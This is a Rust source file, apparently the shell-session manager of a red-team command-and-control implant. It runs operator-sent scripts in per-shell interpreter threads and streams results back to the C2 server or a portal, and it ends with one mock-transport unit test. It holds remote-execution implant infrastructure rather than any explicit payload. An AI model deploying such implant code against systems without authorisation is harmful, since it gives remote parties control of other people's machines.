use std::collections::HashMap;
use std::fmt;
use std::panic::{self, AssertUnwindSafe};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::sync::mpsc;

use eldritch::agent::agent::Agent;
use eldritch::assets::std::EmptyAssets;
use eldritch::{Interpreter, Printer, Span, Value};
use pb::c2::{ReportTaskOutputRequest, ShellTask, ShellTaskOutput, TaskContext, TaskError};
use pb::portal::{self, Mote, ShellPayload};
use transport::Transport;

use crate::agent::ImixAgent;

const INTERPRETER_INACTIVITY_TIMEOUT: Duration = Duration::from_secs(3600);
const INTERPRETER_INACTIVITY_POLLING_INTERVAL: Duration = Duration::from_secs(60);

pub enum ShellManagerMessage {
    ProcessTask(ShellTask),
    ProcessPortalPayload(Mote, mpsc::Sender<Mote>),
}

struct ShellContext {
    task_id: Option<i64>,
    portal_tx: Option<mpsc::Sender<Mote>>,
    stream_id: Option<String>,
    seq_id: Option<u64>,
}

#[derive(Clone)]
// Responsible for sending shell output and errors, either using a portal or regular
// callbacks.
struct MultiOutputShellContext(Arc<Mutex<ShellContext>>);

impl MultiOutputShellContext {
    fn new() -> Self {
        Self(Arc::new(Mutex::new(ShellContext {
            task_id: None,
            portal_tx: None,
            stream_id: None,
            seq_id: None,
        })))
    }

    fn set_task(&self, task_id: i64, seq_id: u64, stream_id: String) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = Some(task_id);
        ctx.seq_id = Some(seq_id);
        ctx.stream_id = Some(stream_id);
    }

    fn set_portal(&self, tx: mpsc::Sender<Mote>, stream_id: String, seq_id: u64) {
        let mut ctx = self.0.lock().unwrap();
        ctx.portal_tx = Some(tx);
        ctx.stream_id = Some(stream_id);
        ctx.seq_id = Some(seq_id);
    }

    fn clear_task(&self) {
        let mut ctx = self.0.lock().unwrap();
        ctx.task_id = None;
        ctx.seq_id = None;
        ctx.stream_id = None;
    }
}

fn send_shell_output<T: Transport + Send + Sync + 'static>(
    agent: &Arc<ImixAgent<T>>,
    context: &MultiOutputShellContext,
    shell_id: i64,
    output: String,
) {
    let ctx = context.0.lock().unwrap();

    // 1. Report to C2 if task_id is present
    if let Some(task_id) = ctx.task_id {
        let req = ReportTaskOutputRequest {
            shell_task_output: Some(ShellTaskOutput {
                id: task_id,
                output: output.clone(),
                error: None,
                exec_started_at: None,
                exec_finished_at: None,
            }),
            ..Default::default()
        };
        match agent.report_task_output(req) {
            Ok(_) => {}
            Err(e) => {
                #[cfg(debug_assertions)]
                log::error!("Failed to report shell task output {}: {}", task_id, e);
            }
        }
    }

    // 2. Report to Portal if active
    if let Some(tx) = &ctx.portal_tx {
        let stream_id = ctx.stream_id.clone().unwrap_or_default();
        let seq_id = ctx.seq_id.unwrap_or(0);

        let payload = ShellPayload {
            shell_id,
            input: output,
        };
        let mote = Mote {
            stream_id,
            seq_id,
            payload: Some(portal::mote::Payload::Shell(payload)),
        };

        let tx = tx.clone();
        tokio::spawn(async move {
            match tx.send(mote).await {
                Ok(_) => {}
                Err(e) => {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send shell output to portal: {}", e);
                }
            };
        });
    }
}

fn send_shell_error<T: Transport + Send + Sync + 'static>(
    agent: &Arc<ImixAgent<T>>,
    context: &MultiOutputShellContext,
    shell_id: i64,
    error: String,
) {
    let ctx = context.0.lock().unwrap();

    if let Some(task_id) = ctx.task_id {
        let req = ReportTaskOutputRequest {
            shell_task_output: Some(ShellTaskOutput {
                id: task_id,
                output: String::new(),
                error: Some(TaskError { msg: error.clone() }),
                exec_started_at: None,
                exec_finished_at: None,
            }),
            ..Default::default()
        };
        let _ = agent.report_task_output(req);
    }

    if let Some(tx) = &ctx.portal_tx {
        let stream_id = ctx.stream_id.clone().unwrap_or_default();
        let seq_id = ctx.seq_id.unwrap_or(0);

        let payload = ShellPayload {
            shell_id,
            input: format!("Error: {}", error),
        };
        let mote = Mote {
            stream_id,
            seq_id,
            payload: Some(portal::mote::Payload::Shell(payload)),
        };
        let tx = tx.clone();
        tokio::spawn(async move {
            let _ = tx.send(mote).await;
        });
    }
}

struct MultiOutputShellPrinter<T: Transport> {
    agent: Arc<ImixAgent<T>>,
    context: MultiOutputShellContext,
    shell_id: i64,
}

impl<T: Transport> fmt::Debug for MultiOutputShellPrinter<T> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("MultiOutputShellPrinter")
            .field("shell_id", &self.shell_id)
            .finish()
    }
}

impl<T: Transport + Send + Sync + 'static> Printer for MultiOutputShellPrinter<T> {
    fn print_out(&self, _span: &Span, s: &str) {
        send_shell_output(
            &self.agent,
            &self.context,
            self.shell_id,
            format!("{}\n", s),
        );
    }

    fn print_err(&self, _span: &Span, s: &str) {
        send_shell_error(&self.agent, &self.context, self.shell_id, s.to_string());
    }
}

// Commands sent to the dedicated interpreter thread
pub enum InterpreterCommand {
    ExecuteTask {
        task_id: i64,
        input: String,
        sequence_id: u64,
        stream_id: String,
    },
    ExecutePortal {
        input: String,
        stream_id: String,
        seq_id: u64,
        reply_tx: mpsc::Sender<Mote>,
    },
    Shutdown,
}

struct InterpreterHandle {
    tx: mpsc::Sender<InterpreterCommand>,
    last_activity: Instant,
}

pub struct ShellManager<T: Transport + Send + Sync + 'static> {
    agent: Arc<ImixAgent<T>>,
    interpreters: HashMap<i64, InterpreterHandle>,
    rx: mpsc::Receiver<ShellManagerMessage>,
}

impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
    pub fn new(agent: Arc<ImixAgent<T>>, rx: mpsc::Receiver<ShellManagerMessage>) -> Self {
        Self {
            agent,
            interpreters: HashMap::new(),
            rx,
        }
    }

    pub async fn run(mut self) {
        let mut cleanup_timer = tokio::time::interval(INTERPRETER_INACTIVITY_POLLING_INTERVAL);

        loop {
            tokio::select! {
                msg = self.rx.recv() => {
                    match msg {
                        Some(ShellManagerMessage::ProcessTask(task)) => {
                            self.handle_task(task).await;
                        }
                        Some(ShellManagerMessage::ProcessPortalPayload(mote, reply_tx)) => {
                            self.handle_portal_payload(mote, reply_tx).await;
                        }
                        None => {
                            break;
                        }
                    }
                }
                _ = cleanup_timer.tick() => {
                    self.cleanup_inactive_interpreters().await;
                }
            }
        }
    }

    async fn handle_task(&mut self, task: ShellTask) {
        self.ensure_interpreter(task.shell_id);

        if let Some(handle) = self.interpreters.get_mut(&task.shell_id) {
            handle.last_activity = Instant::now();
            let _ = handle
                .tx
                .send(InterpreterCommand::ExecuteTask {
                    task_id: task.id,
                    input: task.input,
                    sequence_id: task.sequence_id,
                    stream_id: task.stream_id,
                })
                .await;
        }
    }

    async fn handle_portal_payload(&mut self, mote: Mote, reply_tx: mpsc::Sender<Mote>) {
        if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
            let shell_id = shell_payload.shell_id;
            self.ensure_interpreter(shell_id);

            if let Some(handle) = self.interpreters.get_mut(&shell_id) {
                handle.last_activity = Instant::now();
                let _ = handle
                    .tx
                    .send(InterpreterCommand::ExecutePortal {
                        input: shell_payload.input,
                        stream_id: mote.stream_id,
                        seq_id: mote.seq_id,
                        reply_tx,
                    })
                    .await;
            }
        }
    }

    fn ensure_interpreter(&mut self, shell_id: i64) {
        if !self.interpreters.contains_key(&shell_id) {
            let (tx, rx) = mpsc::channel(32);
            let agent = self.agent.clone();

            // Spawn the long-running blocking task
            tokio::task::spawn_blocking(move || {
                Self::run_interpreter_loop(agent, shell_id, rx);
            });

            self.interpreters.insert(
                shell_id,
                InterpreterHandle {
                    tx,
                    last_activity: Instant::now(),
                },
            );
        }
    }

    // This runs in a dedicated blocking thread
    fn run_interpreter_loop(
        agent: Arc<ImixAgent<T>>,
        shell_id: i64,
        mut rx: mpsc::Receiver<InterpreterCommand>,
    ) {
        let context = MultiOutputShellContext::new();
        let printer = Arc::new(MultiOutputShellPrinter {
            agent: agent.clone(),
            context: context.clone(),
            shell_id,
        });

        // Create dummy TaskContext
        let task_context = TaskContext {
            task_id: 0,
            jwt: String::new(),
        };

        let backend = Arc::new(EmptyAssets {});

        let mut interpreter = Interpreter::new_with_printer(printer)
            .with_default_libs()
            .with_task_context(agent.clone(), task_context, Vec::new(), backend);

        // Process commands
        while let Some(cmd) = rx.blocking_recv() {
            match cmd {
                InterpreterCommand::ExecuteTask {
                    task_id,
                    input,
                    sequence_id,
                    stream_id,
                } => {
                    context.set_task(task_id, sequence_id, stream_id);
                    Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
                    context.clear_task();
                }
                InterpreterCommand::ExecutePortal {
                    input,
                    stream_id,
                    seq_id,
                    reply_tx,
                } => {
                    context.set_portal(reply_tx, stream_id, seq_id);
                    Self::execute_interpret(&mut interpreter, &input, &agent, &context, shell_id);
                }
                InterpreterCommand::Shutdown => {
                    break;
                }
            }
        }
    }

    fn execute_interpret(
        interpreter: &mut Interpreter,
        input: &str,
        agent: &Arc<ImixAgent<T>>,
        context: &MultiOutputShellContext,
        shell_id: i64,
    ) {
        let result = panic::catch_unwind(AssertUnwindSafe(|| interpreter.interpret(input)));

        match result {
            Ok(interpret_result) => match interpret_result {
                Ok(value) => {
                    if !matches!(value, Value::None) {
                        send_shell_output(agent, context, shell_id, format!("{:?}\n", value));
                    }
                }
                Err(e) => {
                    send_shell_error(agent, context, shell_id, e);
                }
            },
            Err(e) => {
                let msg = if let Some(s) = e.downcast_ref::<&str>() {
                    format!(
                        "Critical Error: Panic occurred during shell execution: {}",
                        s
                    )
                } else if let Some(s) = e.downcast_ref::<String>() {
                    format!(
                        "Critical Error: Panic occurred during shell execution: {}",
                        s
                    )
                } else {
                    "Critical Error: Panic occurred during shell execution".to_string()
                };
                send_shell_error(agent, context, shell_id, msg);
            }
        }
    }

    async fn cleanup_inactive_interpreters(&mut self) {
        let now = Instant::now();
        let timeout = INTERPRETER_INACTIVITY_TIMEOUT;

        let mut to_remove = Vec::new();

        for (id, handle) in self.interpreters.iter() {
            if now.duration_since(handle.last_activity) >= timeout {
                to_remove.push(*id);
            }
        }

        for id in to_remove {
            if let Some(handle) = self.interpreters.remove(&id) {
                // Send explicit shutdown (optional since dropping tx also works)
                let _ = handle.tx.send(InterpreterCommand::Shutdown).await;
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::task::TaskRegistry;
    use pb::c2::{ReportTaskOutputResponse, ShellTask};
    use pb::config::Config;
    use transport::MockTransport;

    #[tokio::test]
    async fn test_shell_manager_normal_execution() {
        let (tx, rx) = mpsc::channel(1);
        let runtime_handle = tokio::runtime::Handle::current();

        let config = Config::default();
        let mut transport = MockTransport::default();
        // We expect report_task_output to be called with the result "2\n" for input "1+1"
        transport
            .expect_report_task_output()
            .withf(|req| {
                if let Some(out) = &req.shell_task_output {
                    out.output.contains("2")
                } else {
                    false
                }
            })
            .times(1)
            .returning(|_| Ok(ReportTaskOutputResponse::default()));

        let task_registry = Arc::new(TaskRegistry::new());

        let agent = Arc::new(ImixAgent::new(
            config,
            transport,
            runtime_handle,
            task_registry,
        ));

        let manager = ShellManager::new(agent.clone(), rx);

        let task = ShellTask {
            id: 1,
            shell_id: 1,
            input: "1+1".to_string(),
            sequence_id: 1,
            stream_id: "stream1".to_string(),
        };

        // Send task
        tx.send(ShellManagerMessage::ProcessTask(task))
            .await
            .unwrap();

        // Run manager for a bit
        // We need to give enough time for the message to cross to the other thread, execute, and report back
        tokio::select! {
            _ = manager.run() => {},
            _ = tokio::time::sleep(Duration::from_millis(1000)) => {},
        }

        // Flush outputs to ensure transport mock is called
        agent.flush_outputs().await;
    }
}
